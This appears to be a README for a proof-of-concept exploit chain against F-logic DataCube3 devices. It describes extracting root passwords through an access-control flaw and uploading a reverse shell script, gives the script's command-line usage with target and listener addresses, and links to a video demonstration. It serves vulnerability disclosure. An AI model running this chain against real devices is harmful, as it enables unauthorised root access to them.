# CVE-2024-25830 and CVE-2024-25832 - DataCube3 Improper Access Control and Unrestricted File Upload.

## Overview
This repository features a Proof of Concept (PoC) for a two-step exploit chain targeting DataCube3 devices. It combines CVE-2024-25830 (Improper Access Control) to extract root passwords and CVE-2024-25832 (Unrestricted File Upload) to deploy a reverse shell script. This PoC complements the detailed vulnerability analysis in the blog post "DataCube3 Vulnerability Report."

### Affected versions
All F-logic DataCube3 devices version 1.0.

### PoC Script Usage

```python
# Usage: python datacube3.py --RHOST <Target-IP> --RPORT <Target-Port> --LHOST <Local-IP> --LPORT <Local-Port>
# Example: python datacube3.py --RHOST 192.168.1.1 --RPORT 443 --LHOST 192.168.1.100 --LPORT 4444
```

 ### Video Proof of Concept

![Script PoC CVE-2024-25832](https://neroteam.com/blog/pages/f-logic-datacube3-vulnerability-report/datacube3-1.jpg?m=1709698092)

[![Datacube3 Exploit chain](https://i.ibb.co/7gXHL9q/500px-youtube-social-play.png)](https://youtu.be/5hJKqgYjrVo)

### Note
FOR EDUCATIONAL PURPOSE ONLY.
